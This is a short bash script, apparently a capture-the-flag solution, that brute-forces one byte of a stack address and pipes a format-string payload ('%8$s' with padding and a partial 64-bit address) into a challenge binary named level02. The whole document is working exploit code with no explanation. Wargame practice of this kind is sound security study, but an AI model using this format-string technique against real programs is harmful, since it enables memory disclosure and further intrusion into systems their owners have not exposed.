#!/bin/bash

i=0

while [ $i  -lt 255 ]

do

   x=`printf "\x%02x\n"  $i`

   y=`expr $i + 4`

   z=`printf "\x%02x\n"  $y`

   echo -n -e "*%8\$s*  aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" > /tmp/lv2 && echo -e -n $x >> /tmp/lv2 && echo -e -n "\xe5\xff\xff\xff\x7f" >> /tmp/lv2 && cat /tmp/lv2 - | ~/level02

   echo $x

   i=`expr $i + 1`

done
